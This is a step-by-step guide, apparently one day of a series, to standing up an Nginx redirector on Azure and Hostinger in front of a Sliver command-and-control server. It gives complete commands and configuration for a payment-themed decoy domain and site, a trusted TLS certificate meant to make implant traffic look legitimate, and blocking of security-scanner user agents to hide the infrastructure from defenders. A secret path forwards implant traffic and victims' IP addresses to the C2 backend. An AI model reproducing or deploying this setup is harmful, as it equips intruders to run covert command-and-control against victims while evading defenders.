# Day 3: Setting Up Your Nginx Domain Redirector on Azure & Hostinger

---

## Overview & Traffic Flow

Today we deploy and configure the Nginx domain redirector (`redirector`).

```
[ TARGET IMPLANT ] 
       |
       | HTTPS (Port 443) to updates.ceruleanpay.online/updates/v2/sync
       v
[ NGINX REDIRECTOR VM ] (Terminates Let's Encrypt SSL & Blocks Scanners)
       |
       | Proxy Pass HTTPS (Port 8443)
       v
[ C2 SERVER VM ] (Sliver Backend)
```

---

## Step 1: Provision the Redirector VM on Azure

> **Intent**: Deploys the public-facing Ubuntu VM and configures NSG rules for public HTTPS (port 443) and operator SSH (port 22).

1. Log in to [portal.azure.com](https://portal.azure.com).
2. Search for **Network security groups** -> Click **+ Create**.
   * **Resource group**: `c2-infra-rg`
   * **Name**: `redirector-nsg` -> Click **Review + create** -> **Create**.
3. In `redirector-nsg` -> **Settings** -> **Inbound security rules** -> Click **+ Add**:
   * **Rule 1 (SSH)**: Source: `IP Addresses`, Source IP: `YOUR_OPERATOR_IP`, Service: `SSH`, Port: `22`, Action: `Allow`, Priority: `100`, Name: `Allow-SSH-OperatorOnly`.
   * **Rule 2 (HTTP)**: Source: `Any`, Destination Port: `80`, Protocol: `TCP`, Action: `Allow`, Priority: `105`, Name: `Allow-HTTP-Public` *(Required for Let's Encrypt Certbot domain verification)*.
   * **Rule 3 (HTTPS)**: Source: `Any`, Destination Port: `443`, Protocol: `TCP`, Action: `Allow`, Priority: `110`, Name: `Allow-HTTPS-Public`.
4. Search for **Virtual machines** -> Click **+ Create** -> **Azure virtual machine**.
   * **Basics Tab**:
     * **Resource group**: `c2-infra-rg`
     * **Name**: `redirector`
     * **Region**: `East US`
     * **Image**: `Ubuntu Server 22.04 LTS`
     * **Size**: `Standard_B1s`
     * **Authentication type**: `Password` (User: `c2admin`)
     * **Public inbound ports**: Select **None** (do NOT select "Allow selected ports", as that opens SSH to the entire world).
   * **Networking Tab**:
     * **Virtual network**: `c2-vnet`
     * **Subnet**: `c2-subnet` (or `default`)
     * **Public IP**: Create new `redirector-pip`
     * **NIC network security group**: Select **Advanced** (or **Configure**) -> Select **`redirector-nsg`**.
   * **Monitoring Tab**: Enable Boot Diagnostics with managed storage.
5. Click **Review + create** -> **Create**.
6. **Note Down IPs**:
   * `REDIRECTOR_PUBLIC_IP` (e.g. `20.120.45.12`)
   * `REDIRECTOR_PRIVATE_IP` (e.g. `10.0.0.5`)

---

## Step 2: Update C2 Server NSG & UFW to Trust Redirector

> **Intent**: Grants the redirector VM permission to reach port 8443 on the C2 server while keeping port 8443 blocked from the public internet.

Return to Azure portal -> **Network security groups** -> `c2-server-nsg` -> **Inbound security rules** -> Click **+ Add**:
* **Source**: `IP Addresses`
* **Source IP addresses**: `REDIRECTOR_PUBLIC_IP` (or `10.0.0.0/24` for internal VNet subnet)
* **Destination port ranges**: `8443`
* **Protocol**: `TCP`
* **Action**: `Allow`
* **Priority**: `110`
* **Name**: `Allow-C2-FromRedirector`

SSH into `c2-server` and update UFW:
```bash
sudo ufw allow from REDIRECTOR_PUBLIC_IP to any port 8443 proto tcp
```

---

## Step 3: Configure Hostinger DNS (Subdomain `updates`)

> **Intent**: Points your domain's subdomain (`updates.ceruleanpay.online`) to the public IP of the redirector VM.

1. Log in to [Hostinger Control Panel](https://hpanel.hostinger.com).
2. Go to **Domains** -> Select `ceruleanpay.online` -> **DNS / Name Servers**.
3. Add a new **A Record**:
   * **Type**: `A`
   * **Name**: `updates` (This creates `updates.ceruleanpay.online`)
   * **Points to**: `REDIRECTOR_PUBLIC_IP`
   * **TTL**: `300` (5 minutes)
4. Click **Add Record**.

Verify DNS propagation on your local workstation:
```bash
nslookup updates.ceruleanpay.online
```
* **Expected Output**: Resolves to `REDIRECTOR_PUBLIC_IP`.

---

## Step 4: Hardening & Software Installation on Redirector

> **Intent**: Installs Nginx, Certbot, fail2ban, and enables UFW on the redirector VM.

SSH into `redirector` VM:

```bash
ssh c2admin@REDIRECTOR_PUBLIC_IP
```

### 1. Configure fail2ban & UFW
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y fail2ban nginx certbot python3-certbot-nginx

sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo systemctl restart fail2ban

sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow from YOUR_OPERATOR_IP to any port 22 proto tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

---

## Step 5: Issue SSL Certificate via Let's Encrypt (Certbot)

> **Intent**: Generates a valid, trusted TLS/SSL certificate for `updates.ceruleanpay.online` so implant traffic looks legitimate.

Temporarily stop Nginx to issue the TLS certificate via standalone mode:

```bash
sudo systemctl stop nginx
sudo certbot certonly --standalone -d updates.ceruleanpay.online --register-unsafely-without-email --agree-tos
```

* **Expected Output**:
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/updates.ceruleanpay.online/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/updates.ceruleanpay.online/privkey.pem
```

---

## Step 6: Create Decoy Merchant Landing Page

> **Intent**: Deploys a realistic merchant gateway HTML site to display to scanners and blue team analysts.

Create directory and deploy a realistic HTML page for scanner evasion:

```bash
sudo mkdir -p /var/www/ceruleanpay
sudo nano /var/www/ceruleanpay/index.html
```

Paste the following HTML content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CeruleanPay - Merchant Services Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; max-width: 400px; border: 1px solid #334155; }
        h1 { color: #38bdf8; font-size: 1.5rem; margin-bottom: 0.5rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 1.5rem; }
        .status { background: #0284c7; color: #fff; padding: 0.5rem 1rem; border-radius: 6px; font-weight: 600; font-size: 0.85rem; display: inline-block; }
    </style>
</head>
<body>
    <div class="card">
        <h1>CeruleanPay Gateway</h1>
        <p>Merchant transaction processing service endpoint.</p>
        <div class="status">System Operational</div>
    </div>
</body>
</html>
```

---

## Step 7: Configure Nginx Reverse Proxy with Secret Path Redirect

> **Intent**: Sets up Nginx rules to forward valid implant traffic (`/updates/v2/sync`) to Sliver on port 8443 while blocking scanners and serving the decoy page.

Create the site configuration file:

```bash
sudo nano /etc/nginx/sites-available/updates.ceruleanpay.online
```

Paste the configuration below (replace `C2_SERVER_IP` with your actual C2 VM private or public IP):

```nginx
# User-Agent Blocking for Security Scanners
map $http_user_agent $blocked_agent {
    default 0;
    ~*maltego 1;
    ~*nikto 1;
    ~*nmap 1;
    ~*sqlmap 1;
    ~*zgrab 1;
    ~*censys 1;
    ~*shodan 1;
    ~*python-requests 1;
    ~*curl 1;
}

server {
    listen 80;
    server_name updates.ceruleanpay.online;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name updates.ceruleanpay.online;

    ssl_certificate /etc/letsencrypt/live/updates.ceruleanpay.online/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/updates.ceruleanpay.online/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Block scanners
    if ($blocked_agent) {
        return 404;
    }

    # Secret URI C2 Path Forwarding
    location /updates/v2/sync {
        proxy_pass https://10.0.0.4:8443; # Use C2 server private VNet IP
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
    }

    # Default Catch-all (Serves Merchant Decoy Site)
    location / {
        root /var/www/ceruleanpay;
        index index.html;
    }
}
```

### Nginx Configuration Rules Explained (1-Liners)

* **`map $http_user_agent`**: Matches automated scanner User-Agents (Shodan, Censys, Nmap, curl) and sets a flag to block them.
* **`listen 80`**: Redirects all unencrypted HTTP traffic to HTTPS on port 443.
* **`listen 443 ssl http2`**: Enables HTTPS using Let's Encrypt certificates so the blue team sees a trusted SSL cert.
* **`if ($blocked_agent) { return 404; }`**: Immediately drops scanner requests with a 404 error.
* **`location /updates/v2/sync`**: Secret URI path that proxies valid implant traffic to Sliver on `C2_SERVER_IP:8443`.
* **`proxy_ssl_verify off;`**: Allows Nginx to trust Sliver's internal self-signed certificate on port 8443.
* **`proxy_set_header X-Forwarded-For`**: Forwards the victim's real public IP address to Sliver.
* **`location /`**: Serves the fake merchant landing page (`index.html`) to anyone visiting any other path.

Enable the site and verify Nginx syntax:

```bash
sudo ln -s /etc/nginx/sites-available/updates.ceruleanpay.online /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo nginx -t
```
* **Expected Output**: `syntax is ok / test is successful`.

Start Nginx:
```bash
sudo systemctl restart nginx
```

---

## Step 8: Verify End-to-End Traffic Routing

> **Intent**: Validates that public HTTPS hits the decoy site, bad paths return 404, and the secret path proxies to Sliver.

Run these tests from your local workstation:

### Test 1: Public HTTPS Landing Page (Decoy Site)
```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -I https://updates.ceruleanpay.online
```
* **Expected Output**: `HTTP/2 200` (Returns the HTML decoy page).

### Test 2: Scanner Blocking Test (Default curl User-Agent)
```bash
curl -I https://updates.ceruleanpay.online
```
* **Expected Output**: `HTTP/2 404` (Nginx scanner blocking rule matches `curl` User-Agent and drops request).

### Test 3: Secret Path Forwarding to C2 Backend
```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -k -I https://updates.ceruleanpay.online/updates/v2/sync
```
* **Expected Output**: `HTTP/2 404` (Forwarded through Nginx to Sliver, which returns 404 for non-implant HTTP requests).

---

## Day 3 Summary Checklist

| Component | Status | Verification Result |
|---|---|---|
| Hostinger DNS | Active | `updates.ceruleanpay.online` points to `REDIRECTOR_PUBLIC_IP` |
| SSL Certificate | Issued | Valid Let's Encrypt cert in `/etc/letsencrypt/live/` |
| Nginx Reverse Proxy | Running | `nginx -t` passes without errors |
| Secret Path `/updates/v2/sync` | Active | Forwards HTTPS requests to `C2_SERVER_IP:8443` |
| Scanner Evasion | Active | Unknown paths return decoy page or 404 |

---
**Next Step**: Proceed to [03_payload_test.md](./03_payload_test.md) to generate the payload, execute on Windows target, and inspect C2 telemetry.
